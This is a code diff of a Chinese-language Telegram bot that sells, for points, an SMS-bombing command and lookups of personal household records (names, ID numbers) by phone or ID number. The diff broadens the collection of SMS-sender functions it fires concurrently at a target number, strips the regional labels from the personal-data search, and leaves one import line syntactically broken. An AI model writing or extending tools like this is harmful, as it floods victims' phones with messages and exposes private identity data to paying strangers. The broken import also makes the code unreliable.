@@ -9,8 +9,7 @@ import itertools
 import binascii
 import random
 import concurrent.futures
-from sms_list import * # 👈 这里是建立连接的桥梁
-from Crypto.Cipher import DES3
+from sms_list import * from Crypto.Cipher import DES3
 from datetime import datetime
 from telebot import types
 from concurrent.futures import ThreadPoolExecutor
@@ -61,7 +60,7 @@ def save_token(new_tk):
     with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
         f.write(new_tk)
 
-# ================= 2. 河北解密逻辑 =================
+# ================= 2. 解密逻辑 =================
 
 def decrypt_data(encrypted_text_hex, key):
     try:
@@ -102,7 +101,7 @@ def hb_search_logic(chat_id, search_value, uid):
                 user_points[uid] -= 5.5
                 save_points()
 
-                result_message = "✅河北全户查询结果:\n"
+                result_message = "✅查询结果:\n"
                 for item in result_data["page"]:
                     result_message += f"姓名:{item['resName']}\n"
                     result_message += f"证件:{item['sfcode']}\n"
@@ -232,9 +231,14 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
 
 # ================= 5. 指令与消息处理 =================
 
-# 👈 这里修改了探测器，让它能同时认出 "send_sms_" 和 "短信"
 def get_all_senders():
-    return [obj for name, obj in globals().items() if name.startswith("send_sms_") or name.startswith("短信")]
+    """全量抓取 sms_list.py 中的所有接口函数"""
+    prefixes = ("send_sms_", "短信", "send_request", "request_url", "send_", "短信接口", "request_")
+    all_funcs = []
+    for name, obj in globals().items():
+        if any(name.startswith(p) for p in prefixes) and callable(obj):
+            all_funcs.append(obj)
+    return all_funcs
 
 @bot.message_handler(commands=['sms'])
 def sms_bomb_cmd(message):
@@ -250,12 +254,10 @@ def sms_bomb_cmd(message):
     all_funcs = get_all_senders()
     bot.reply_to(message, f"🎯 **已加载接口：{len(all_funcs)}个**\n正在对 `{target}` 开启火力覆盖...", parse_mode='Markdown')
     
-    # 按照你的帮助文档说明扣除 5.5 积分
     user_points[uid] -= 5.5; save_points()
 
     def do_bomb():
         random.shuffle(all_funcs)
-        # 增加并发到 60 提升火力
         with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
             for func in all_funcs:
                 executor.submit(func, target)
@@ -266,7 +268,7 @@ def sms_bomb_cmd(message):
 @bot.message_handler(commands=['hb'])
 def hb_cmd(message):
     if user_points.get(message.from_user.id, 0.0) < 5.5: return bot.reply_to(message, "积分不足，请先充值！")
-    bot.send_message(message.chat.id, "请输入河北身份证号或手机号进行查询")
+    bot.send_message(message.chat.id, "请输入身份证号或手机号进行查询")
 
 @bot.message_handler(commands=['admin'])
 def admin_cmd(message):
@@ -325,7 +327,6 @@ def handle_all(message):
     uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
     if text.startswith('/'): return 
     
-    # 手机号或身份证号直接识别（HB查询）
     if re.match(r'^1[3-9]\d{9}$', text) or re.match(r'^\d{17}[\dXx]$', text):
         if user_points.get(uid, 0.0) < 5.5: return bot.reply_to(message, "积分不足，请先充值！")
         return hb_search_logic(chat_id, text, uid)
@@ -374,7 +375,7 @@ def handle_callback(call):
     if call.data == "view_help":
         help_text = (
             "🛠️️使用帮助\n"
-            "短信压力测试 (新)\n"
+            "短信测试 (新)\n"
             "发送 /sms 手机号\n"
             "每次消耗 5.5 积分\n"
             "——————————————————\n"
@@ -391,8 +392,8 @@ def handle_callback(call):
             "每次核验扣除 0.5 积分\n"
             "——————————————————\n"
             "河北全户查询\n"
-            "发送 /hb 进行查询\n"
-            "每次查询扣除3.5积分\n"
+            "发送手机号或身份证直接查询\n"
+            "每次查询扣除 5.5 积分\n"
         )
         bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
     elif call.data == "view_pay":
